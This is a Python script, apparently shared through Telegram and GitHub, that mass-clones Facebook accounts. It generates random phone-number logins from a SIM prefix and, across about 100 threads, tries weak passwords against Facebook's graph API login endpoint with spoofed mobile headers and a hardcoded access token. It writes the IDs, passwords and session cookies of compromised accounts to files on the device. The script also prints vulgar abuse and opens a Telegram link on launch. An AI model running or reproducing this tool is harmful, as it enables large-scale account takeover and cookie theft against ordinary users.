#!/usr/bin/python3
'''
 </> ---------------------------------------------
 </> Released By : Tajul Islam Rabbi
 </> ---------------------------------------------
 </> coded by -> TAJUL ISLAM RABBI
 </> Project -> CP ID CLONING 99% LOG IN
 </> Updated On -> 18 MARCH 2025
 </> Channel -> https://t.me/+S-8XSMpDGjYyOWY1
 </> GitHub -> https://github.com/Hacker1414
 </> ---------------------------------------------
'''
import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor as tred

class THExKILLER:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
    print ("JOIN MY TELEGRAM  CHANNEL  ")
    os.system(" xdg-open https://t.me/+S-8XSMpDGjYyOWY1")
    def banner(self):
        os.system("clear")
        print(f"""
\033[1;31m┏━━┓━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┏━━┓
\033[1;31m┃😈┃\033[47m\033[1;46m   𝗧𝗛𝗘 𝗖𝗬𝗕𝗘𝗥 𝗠𝗔𝗙𝗜𝗔  ➤   NUSRAT ER VAIYA     \033[40m\033[00m\x1b[1;91m┃😈┃
\033[1;31m┗━━┛━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━═━┗━━┛
\033[1;31m┏\033[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━━━\033[1;31m┓
\033[1;32m┃ \033[1;31m┏━┓ \033[1;36m➤  ┏━━━━━━┓    ┏━┓    ┏━━━━━┓  ┏━━━━━┓  ┏━┓  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mC\033[1;31m┃ \033[1;31m➤  ┃ ┏━━┓ ┃   ┏┛ ┗┓   ┃ ┏━┓ ┗┓ ┃ ┏━┓ ┗┓ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mY\033[1;31m┃ \033[1;32m➤  ┃ ┗━━┛ ┃  ┏┛   ┗┓  ┃ ┃ ┗┓ ┃ ┃ ┃ ┗┓ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mB\033[1;31m┃ \033[1;33m➤  ┃  ┏━━━┛ ┏┛ ┏━┓ ┗┓ ┃ ┗━━┛ ┃ ┃ ┗━━┛ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mE\033[1;31m┃ \033[1;34m➤  ┃  ┗━┓   ┃  ┗━┛  ┃ ┃ ┏━━┓ ┃ ┃ ┏━━┓ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;36mR\033[1;31m┃ \033[1;35m➤  ┃ ┏━┓┗┓  ┃ ┏━━━┓ ┃ ┃ ┃ ┏┛ ┃ ┃ ┃ ┏┛ ┃ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤  ┃ ┃ ┗┓┗┓ ┃ ┃   ┃ ┃ ┃ ┗━┛ ┏┛ ┃ ┗━┛ ┏┛ ┃ ┃  \033[1;32m┃
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤  ┗━┛  ┗━┛ ┗━┛   ┗━┛ ┗━━━━━┛  ┗━━━━━┛  ┗━┛  \033[1;32m┃
\033[1;32m┃ \033[1;31m┏━┓ \033[1;30m➤ \033[1;32m┏\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m┓ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mR\033[1;31m┃ \033[1;32m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;32m𝐀𝐮𝐭𝐡𝐨𝐫      \033[1;32m➤   \033[1;32mRABBI 𝐇𝐎𝐒𝐒𝐀𝐈𝐍    \033[1;31m┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mA\033[1;31m┃ \033[1;37m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;37m𝐆𝐢𝐭𝐇𝐮𝐛      \033[1;32m➤   \033[1;37mRABBI-1414    \033[1;31m    ┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mB\033[1;31m┃ \033[1;33m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;35mChannel     \033[1;32m➤   \033[1;35mCYBER-RABBI     \033[1;31m ┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mB\033[1;31m┃ \033[1;34m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;36m𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦    \033[1;32m➤   \033[1;36mCYBER-RABBI   \033[1;31m   ┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┃\033[1;32mI\033[1;31m┃ \033[1;35m➤ \033[1;31m┃  \033[1;33m⌠\033[1;32m+\033[1;33m⌡  \033[1;34mTOOLS       \033[1;32m➤   \033[1;34mPAID           \033[1;31m  ┃ \033[1;32m┃
\033[1;32m┃ \033[1;31m┗━┛ \033[1;36m➤ \033[1;32m┗\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;32m┛ \033[1;32m┃
\033[1;31m┗\033[1;32m━━━═━═━═━═━═━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━═━═━═━━━\033[1;31m┛""")
    
    def Main(self):
        self.banner()
        code = input("\033[1;32mENTER SIM CODE : ")
        limit = int(input("ENTER ID LIMIT : "))
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(8))
            self.gen.append(xxx)
        with tred(max_workers=100) as randx:
            print("IF NO RESULT USE FLIGHT MODE EVERY 5 MUNITES")
            print("<°°°>T<°°°>H<°°°>E<°°°>K<°°°>I<°°°>L<°°°>L<°°°>E<°°°>R<°°°>C<°°°>Y<°°°>B<°°°>E<°°°>R<°°°>R<°°°>A<°°°>B<°°°>B<°°°")
            for love in self.gen:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],"i love you","ff lover"]
                randx.submit(self.method,ids,passlist)
        print("\n")
        print("</> Note : Fuxk You Kids | We Don’t Sacrifice x 𝗧𝗛𝗘𝘅𝗞𝗜𝗟𝗟𝗘𝗥𝘅𝗥𝗔𝗕𝗕𝗜 & ＬＭＮｘ９YOUR MOM FUCK BY PUSSY AND POMPOM </>")
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mTHExKILLER-XD {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'User-Agent':self.randua(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    req = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal").text
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mTHExKILLER-OK • {uid} • {pas}")
                        open("/sdcard/THExKILLER-RENDOME-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/THExKILLER-RENDOME-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
    
    def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/502.0.0.66.79;FBBV/459420566;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/WIFI;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205F;FBSV/5.0;nullFBCA/armeabi-v7a:;]"
        ua2 = "[FBAN/FB4A;FBAV/502.0.0.66.79;FBBV/459420566;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205F;FBSV/5.0;nullFBCA/armeabi-v7a:;]"
        ua3 = "[FBAN/FB4A;FBAV/503.0.0.69.76;FBBV/459620350;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205F;FBSV/5.0;nullFBCA/armeabi-v7a:;]"
        ua4 = "[FBAN/FB4A;FBAV/503.0.0.69.76;FBBV/459620350;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-S205DL;FBSV/5.0;nullFBCA/armeabi-v7a:;]"
        ua5 = "[FBAN/FB4A;FBAV/501.0.0.61.70;FBBV/459218371;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/WIFI;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-S205DL;FBSV/5.0;nullFBCA/armeabi-v7a:;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)

if __name__ == "__main__":
    THExKILLER().Main()
